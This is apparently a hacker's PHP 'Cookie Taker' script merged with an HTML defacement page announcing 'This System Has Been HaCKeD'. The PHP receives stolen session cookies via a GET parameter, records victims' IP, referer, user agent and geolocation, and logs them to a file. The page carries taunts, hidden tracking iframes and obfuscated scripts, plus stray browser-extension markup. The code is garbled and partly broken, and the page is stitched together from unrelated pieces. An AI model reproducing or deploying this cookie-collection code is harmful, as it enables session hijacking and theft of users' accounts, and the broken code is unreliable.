<?php
###########################
#
#
#
# ------> Cookie Taker <------
#         Made By VectorF87
#
#
###########################

$cookie = "[+]Victim Cookie => [ " . $_GET['cookie'] . " ]";
$ip = "[+]Victim IP => [ " . $_SERVER['REMOTE_ADDR'] . " ]";
$ref = "[+]Victim Comes From => [ " . $_SERVER['HTTP_REFERER'] . " ]";
$uAgent = "[+]Victim uAgent => [ " . $_SERVER['HHTP_USER_AGENT'] . " ]";
$sIP = "[+]Server Ip => [ " . $_SERVER['SERVER_ADDR'] . " ]";

// stack over flow code 
function get_ip() {
    $ip = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }else if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else if(isset($_SERVER['HTTP_X_FORWARDED'])){
        $ip = $_SERVER['HTTP_X_FORWARDED'];
    }else if(isset($_SERVER['HTTP_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_FORWARDED_FOR'];
    }else if(isset($_SERVER['HTTP_FORWARDED'])){
        $ip = $_SERVER['HTTP_FORWARDED'];
    }else if(isset($_SERVER['REMOTE_ADDR'])){
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    
    return $ipaddress;


$PublicIP = get_client_ip();    
$json     = file_get_contents("http://ipinfo.io/$PublicIP/gep");
$json     = json_decode($json, true);   
$country  = "User Country Is => " . $json['country'];
$region   = "User Reigon Is => " . $json['region'];
$city     = "User City Is => " . $json['city'];
// en of stack overflow code
#######
$all = "\n- - - - -{Begin}- - - - -\n" . $cookie . "\n\n" . $ip . "\n\n" .    $ref . "\n\n" . $uAgent . "\n\n" . $sIP . "\n\n" . $country . "\n\n"  . $region . 
"\n\n" . $city . "\n\n" . "- - - - -{End}- - - - -"

$handle = fopen('cookies_logs.txt', 'a');
fwrite($handle, $all);
fclose('cookies_logs.txt' , 'a');
?>
<!DOCTYP html>
<html><head>
<title>HaCkED By Vector  </title>
<link rel="icon" href="">
<meta name="keywords" content="V3ct00r Fl2m3">
<meta name="keywords" content="V3F2">
<meta charset="UTF-8">
<meta name="description" content="V3ct00rF87">
<link rel="shortcut icon" href="" type="image/x-icon">
<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
<style type="text/css">
<!--body,td,th {color: #CCCCCC;}
body {background=http://i.imgur.com/5xLle3r.gif; }
.style1 {font-family: Iceland;font-size: 10pt;}
.style2 {color: #00F000;font-weight: bold;}
.style3 {color: #FFFFFF}
.style7 {color: #FFFFFF; font-weight: bold; }
.style8 {font-family: Iceland;
font-size: 16pt;color: #FFFFFF;}
.style11 {font-size: 14pt}--></style></head>
<body bgcolor="#000000">
        <div style="display:none" id="sbbhscc"></div>
          <script type="text/javascript">
            var sbbvscc='';
            var sbbgscc='';
            function genPid() {return String.fromCharCode(69)+String.fromCharCode(102) ; };
          </script>

        <div id="sbbfrcc" style="position: absolute; top: -10px; left: 30px; font-size:1px"><img src="https://presidentcup.ae/sbbi/?sbbpg=utMedia&amp;vii=fh4492015060e439c43cf39e219aee9d42c336eccd141998ecdc00752f8b7677wbn5i2s5"><iframe id="SBBCrossIframe" title="SBBCrossIframe" lang="en" aria-hidden="true" scrolling="NO" src="https://presidentcup.ae/sbbi/?sbbpg=sbbShell&amp;gprid=Ef&amp;sbbgs=h42100494c3e1aed236cd498cc05fb67b525&amp;ddl=1" style="visibility: hidden; border: 0px; height: 1px; width: 0px;"></iframe></div>
  <script type="text/javascript">(function(XHR){var open=XHR.prototype.open;var send=XHR.prototype.send;var parser=document.createElement('a');XHR.prototype.open=function(method, url, async, user, pass){if(typeof async=='undefined'){async=true;}parser.href=url;if(parser.host==''){parser.href=parser.href;}this.ajax_hostname=parser.hostname;open.call(this, method, url, async, user, pass);};XHR.prototype.send=function(data){if(location.hostname==this.ajax_hostname)this.setRequestHeader("X-MOD-SBB-CTYPE", "xhr");send.call(this, data);}})(XMLHttpRequest);if(typeof(fetch)!="undefined"){var nsbbfetch=fetch;fetch=function(url, init){if(typeof(url)==="object" && typeof(url.url)==="string"){init={method: url.method, mode: url.mode, cache: url.cache, credentials: url.credentials, headers: url.headers, body: url.body};url=url.url;}function sbbSd(url, domain){var parser=document.createElement('a');parser.href=url;if(parser.host==''){parser.href=parser.href;}return parser.hostname==location.hostname;}if(sbbSd(url, document.domain)){init=typeof init !=='undefined' ? init :{};if(typeof(init.headers)==="undefined"){init.headers={};}init.headers['X-MOD-SBB-CTYPE']='fetch';}return nsbbfetch(url, init);};}function sbbgc(check_name){var start=document.cookie.indexOf(check_name+"=");var oVal='';var len=start+check_name.length+1;if((!start)&&(document.cookie.substring(0,check_name.length)!=check_name)){oVal='';}else if(start==-1){oVal='';}else{var end=document.cookie.indexOf(';',len);if(end==-1)end=document.cookie.length;var oVal=document.cookie.substring(len,end);};return oVal;}function addmg(inm,ext){var primgobj=document.createElement('IMG');primgobj.src=window.location.protocol+"//"+window.location.hostname+(window.location.port && window.location.port!=80 ? ':'+window.location.port: '')+"/sbbi/?sbbpg="+inm+(ext?"&"+ext:"");var sbbDiv=document.getElementById('sbbfrcc');sbbDiv.appendChild(primgobj);};function addprid(prid){var oldVal=sbbgc("PRLST");if((oldVal.indexOf(prid)==-1)&&(oldVal.split('/').length<5)){if(oldVal!=''){oldVal+='/';}document.cookie='PRLST='+oldVal+escape(prid)+';path=/;';}}var sbbeccf=function(){this.sp3="jass";this.sf1=function(vd){return sf2(vd)+32;};var sf2=function(avd){return avd*12;};this.sf4=function(yavd){return yavd+2;};var strrp=function(str, key, value){if(str.indexOf('&'+key+'=')> -1 || str.indexOf(key+'=')==0){var idx=str.indexOf('&'+key+'=');if(idx==-1)idx=str.indexOf(key+'=');var end=str.indexOf('&', idx+1);var newstr;if(end !=-1)newstr=str.substr(0, idx)+str.substr(end+(idx ? 0 : 1))+'&'+key+'='+value;else newstr=str.substr(0, idx)+'&'+key+'='+value;return newstr;}else return str+'&'+key+'='+value;};var strgt=function(name, text){if(typeof text !='string')return "";var nameEQ=name+"=";var ca=text.split(/[;&]/);for(var i=0;i < ca.length;i++){var c=ca[i];while(c.charAt(0)==' ')c=c.substring(1, c.length);if(c.indexOf(nameEQ)==0)return c.substring(nameEQ.length, c.length);}return "";};this.sfecgs={sbbgh:function(){var domain=document.location.host;if(domain.indexOf('www.')==0)domain=domain.replace('www.', '');return domain;}, f:function(name, value){var fv="";if(window.globalStorage){var host=this.sbbgh();try{if(typeof(value)!="undefined")globalStorage[host][name]=value;else{fv=globalStorage[host][name];if(typeof(fv.toString)!="undefined")fv=fv.toString();}}catch(e){}}return fv;}, name:"sbbrf"};this.sfecls={f:function(name, value){var fv="";try{if(window.localStorage){if(typeof(value)!="undefined")localStorage.setItem(name, value);else{fv=localStorage.getItem(name);if(typeof(fv.toString)!="undefined")fv=fv.toString();}}}catch(e){}return fv;}, name:"sbbrf"};this.sbbcv=function(invl){try{var invalArr=invl.split("-");if(invalArr.length>1){if(invalArr[0]=="A"||invalArr[0]=="D"){invl=invalArr[1];}else invl="";}if(invl==null||typeof(invl)=="undefined"||invl=="falseImgUT"||invl=="undefined"||invl=="null"||invl!=encodeURI(invl))invl="";if(typeof(invl).toLowerCase()=="string")if(invl.length>20)if(invl.substr(0,2)!="h4")invl="";}catch(ex){invl="";}return invl;};this.sbbsv=function(fv){for(var elm in this){if(this[elm].name=="sbbrf"){this[elm].f("altutgv2",fv);}}document.cookie="UTGv2="+fv+';expires=Wed, 06-Oct-21 00:41:45 GMT;path=/;';};this.sbbgv=function(){var valArr=Array();var currVal="";for(var elm in this){if(this[elm].name=="sbbrf"){currVal=this[elm].f("altutgv2");currVal=this.sbbcv(currVal);if(currVal!="")valArr[currVal]=(typeof(valArr[currVal])!="undefined"?valArr[currVal]+1:1);}}var lb=0;var fv="";for(var val in valArr){if(valArr[val]>lb){fv=val;lb=valArr[val]}}if(fv=="")fv=sbbgc("UTGv2");fv=this.sbbcv(fv);if(fv!="")this.sbbsv(fv);else this.sbbsv("D-h4ce46132bdea36b5500363d23872d312879");return fv;};};function m2vr(m1,m2){var i=0;var rc="";var est="ghijklmnopqrstuvwyz";var rnum;var rpl;var charm1=m1.charAt(i);var charm2=m2.charAt(i);while(charm1!=""||charm2!=""){rnum=Math.floor(Math.random()* est.length);rpl=est.substring(rnum,rnum+1);rc+=(charm1==""?rpl:charm1)+(charm2==""?rpl:charm2);i++;charm1=m1.charAt(i);charm2=m2.charAt(i);}return rc;}function sbbls(prid){try{var eut=sbbgc("UTGv2");window.sbbeccfi=new sbbeccf();window.sbbgs=sbbeccfi.sbbgv();if(eut!=sbbgs && sbbgs!="" && typeof(sbbfcr)=="undefined"){addmg('utMedia',"vii="+m2vr("f49056e3c3f929e94c3ec119ed072877",sbbgs));}var sbbiframeObj=document.createElement('IFRAME');var dfx=new Date();sbbiframeObj.id='SBBCrossIframe';sbbiframeObj.title='SBBCrossIframe';sbbiframeObj.tabindex='-1';sbbiframeObj.lang='en';sbbiframeObj.style.visibility='hidden';sbbiframeObj.setAttribute('aria-hidden', 'true');sbbiframeObj.style.border='0px';if(document.all){sbbiframeObj.style.position='absolute';sbbiframeObj.style.top='-1px';sbbiframeObj.style.height='1px';sbbiframeObj.style.width='28px';}else{sbbiframeObj.style.height='1px';sbbiframeObj.style.width='0px';}sbbiframeObj.scrolling="NO";sbbiframeObj.src=window.location.protocol+"//"+window.location.hostname+(window.location.port && window.location.port!=80 ? ':'+window.location.port: '')+'/sbbi/?sbbpg=sbbShell&gprid='+prid + '&sbbgs='+sbbgs+'&ddl='+(Math.round(dfx.getTime()/1000)-1617928905)+'';var sbbDiv=document.getElementById('sbbfrcc');sbbDiv.appendChild(sbbiframeObj);}catch(ex){;}}try{var y=unescape(sbbvscc.replace(/^<\!\-\-\s*|\s*\-\->$/g,''));document.getElementById('sbbhscc').innerHTML=y;var x=unescape(sbbgscc.replace(/^<\!\-\-\s*|\s*\-\->$/g,''));}catch(e){x='function genPid(){return "jser";}';}try{if(window.gprid==undefined)document.write('<'+'script type="text/javascri'+'pt">'+x+"var gprid=genPid();addprid(gprid);sbbls(gprid);<"+"/script>");}catch(e){addprid("dwer");}</script><script type="text/javascript">var gprid=genPid();addprid(gprid);sbbls(gprid);</script> 
<p align="center"><font face="Iceland" color="#FFFFFF" size="4">[ </font>
<font face="Iceland" color="#FFFFFF" size="6">noon sec in dis web site ;) </font><font face="Iceland" color="#FFFFFF" size="4"> 
]</font></p>
<p align="center"><b><span lang="ar-sa">
<font face="Segoe UI Semibold" color="#FFFFFF">
        <span>root@</span><span style="color:red;">v3ct00rF87</span><span>:~# </span><span id="caption">Hello? Hey Sir &gt; This System Has Been HaCKeD By VECTOR FLAME -&gt; Bye (: ~</span><span id="cursor" style="font-size: 0.7em !important; opacity: 0.00615583;"> â–‚</span></font></span></b></p>
<p align="center">
<p align="center"  size="3"><b><span lang="ar-sa">

<font face="Sagoe UI Senibold" color="#FFFFFF">







                             ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠛⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠉⣡⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⡘⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⣤⣷⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠋⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠈⠛⠋⠩⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⡿⠀⠉⢢⣀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⠙⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠓⠶⠂⠀⠘⢎⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⢣⣿⣿⡿⠛⠛⠛⢿⣿⣿⣿⡏⠠⢀⣀⠀⠄⠀⢈⣼⣿⡿⠛⠛⠻⢿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠀⣾⣿⣿⠳⡆⢀⠀⢸⣿⣿⣿⣇⠀⠈⠉⠁⠀⡠⠊⣿⣿⡇⠀⠀⠀⠀⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⢻⣿⡆⠁⠹⠀⢸⣿⣿⣿⣧⣽⣦⣤⣤⣮⣶⣾⣿⣿⡇⠀⠀⠀⠀⣿⣿⣿⣇⢻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠃⣾⣿⣧⠀⠀⢦⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠲⢤⠀⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠿⠿⠿⠷⣄⡈⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠖⠛⠛⡛⠿⢇⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠔⣫⠀⠀⠀⠀⠀⠀⠨⢃⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠈⣥⣀⠉⠢⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠊⠀⠈⠀⠀⠸⡀⠀⣀⣤⢏⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡹⢲⣄⠀⠀⠀⠉⠃⠀⠃⠉⠢⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠛⠲⠤⡤⡲⠀⠀⣀⣵⣾⣿⣿⡆⢂⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⢣⣿⣿⣿⣦⣀⠀⠈⠑⣕⢴⠒⠛⡛⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⠀⢴⠀⠪⠞⣹⣧⣾⣿⣿⣿⣿⣿⣿⣈⡾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣨⣾⣿⣿⣿⣿⣿⣷⣤⣺⡄⠓⠃⠀⠈⢻⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠃⠀⠀⣠⠖⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⢀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⠁⠀⠴⠚⠁⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⡄⠸⠄⢃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣅⡀⢠⣢⠑⠆⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⢡⢠⢀⡠⠧⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡟⠀⡄⣩⣳⢧⡄⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⡔⢣⣣⡄⡀⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡎⠀⢀⣗⠁⠁⣼⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⢗⡃⢠⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
















<p align="center"><b><span lang="ar-sa">
<font color="#FFFFFF" face="Segoe UI Semibold"> وَاللَّـهُ خَلَقَكُمْ وَمَا تَعْمَلُونَ#</font></span></b></p>                       </font>
<p align="center"><b><span lang="ar-sa">
<font face="Segoe UI Semibold" color:#FFFFFF">NOTE: Don't Try To Find Me, I Am Anonymous As Fuck-------->🖕(•̀ᴗ•́ )🖕 </font>
<p align="center"><b><span lang="ar-sa">
<font face="Iceland" color="#0000FF"size="6"><a href="https://www.instagram.com/vectorf87/"color="0000FF">V3CT0R FL2M3</a></font></span></b></p>
<p align="center"><b><span lang="ar-sa">
 
<div id="uvpn_rate_us" style="display: none;">            <div class="uvpn_wrap">                <div class="uvpn_logo-ext">                    <div class="uvpn_logo-wrap">                        <img src="chrome-extension://jaoafpkngncfpfggjefnekilbkcpjdgp/img/128.png">                    </div>                </div>                <div class="uvpn_title">                    Don’t Forget to Rate Us                </div>                <div class="uvpn_desc">                    If you enjoy our product, give us 5 stars. It helps so much!                </div>                <div class="stars">                    <svg xmlns="http://www.w3.org/2000/svg" width="1235" height="1175" viewBox="0 0 1235 1175">                        <path fill="#cf6218" d="M0,449h1235l-999,726 382-1175 382,1175z"></path>                    </svg>                    <svg xmlns="http://www.w3.org/2000/svg" width="1235" height="1175" viewBox="0 0 1235 1175">                        <path fill="#cf6218" d="M0,449h1235l-999,726 382-1175 382,1175z"></path>                    </svg>                    <svg xmlns="http://www.w3.org/2000/svg" width="1235" height="1175" viewBox="0 0 1235 1175">                        <path fill="#cf6218" d="M0,449h1235l-999,726 382-1175 382,1175z"></path>                    </svg>                    <svg xmlns="http://www.w3.org/2000/svg" width="1235" height="1175" viewBox="0 0 1235 1175">                        <path fill="#cf6218" d="M0,449h1235l-999,726 382-1175 382,1175z"></path>                    </svg>                    <svg xmlns="http://www.w3.org/2000/svg" width="1235" height="1175" viewBox="0 0 1235 1175">                        <path fill="#cf6218" d="M0,449h1235l-999,726 382-1175 382,1175z"></path>                    </svg>                </div>                <a target="_blank" href="https://chrome.google.com/webstore/detail/uvpn-free-and-unlimited-v/jaoafpkngncfpfggjefnekilbkcpjdgp/reviews" id="rate_btn_rateus" class="uvpn_rate-btn uvpn_btn">                    Rate Us                </a>                <div id="close_btn_rateus" class="uvpn_later-btn uvpn_btn">                    Not Now                </div>            </div>        </div><div id="uvpn_rate_us" style="display: none;">            <div class="uvpn_wrap">                <div class="uvpn_logo-ext">                    <div class="uvpn_logo-wrap">                        <img src="chrome-extension://jaoafpkngncfpfggjefnekilbkcpjdgp/img/128.png">                    </div>                </div>                <div class="uvpn_title">                    Don’t Forget to Rate Us                </div>                <div class="uvpn_desc">                    If you enjoy our product, give us 5 stars. It helps so much!                </div>                <div class="stars">                    <svg xmlns="http://www.w3.org/2000/svg" width="1235" height="1175" viewBox="0 0 1235 1175">                        <path fill="#cf6218" d="M0,449h1235l-999,726 382-1175 382,1175z"></path>                    </svg>                    <svg xmlns="http://www.w3.org/2000/svg" width="1235" height="1175" viewBox="0 0 1235 1175">                        <path fill="#cf6218" d="M0,449h1235l-999,726 382-1175 382,1175z"></path>                    </svg>                    <svg xmlns="http://www.w3.org/2000/svg" width="1235" height="1175" viewBox="0 0 1235 1175">                        <path fill="#cf6218" d="M0,449h1235l-999,726 382-1175 382,1175z"></path>                    </svg>                    <svg xmlns="http://www.w3.org/2000/svg" width="1235" height="1175" viewBox="0 0 1235 1175">                        <path fill="#cf6218" d="M0,449h1235l-999,726 382-1175 382,1175z"></path>                    </svg>                    <svg xmlns="http://www.w3.org/2000/svg" width="1235" height="1175" viewBox="0 0 1235 1175">                        <path fill="#cf6218" d="M0,449h1235l-999,726 382-1175 382,1175z"></path>                    </svg>                </div>                <a target="_blank" href="https://c4.wallpaperflare.com/wallpaper/65/806/354/anime-naruto-madara-uchiha-wallpaper-preview.jpg" id="rate_btn_rateus" class="uvpn_rate-btn uvpn_btn">                    Rate Us                </a>                <div id="close_btn_rateus" class="uvpn_later-btn uvpn_btn">                    Not Now            
<h2><span style="color:#FFFFFF;">NOTE </span>: Don't Try To Find Me, I Am Anonymous As Fuck </h2>
    </div>            </div>        </div></body></html>

                 
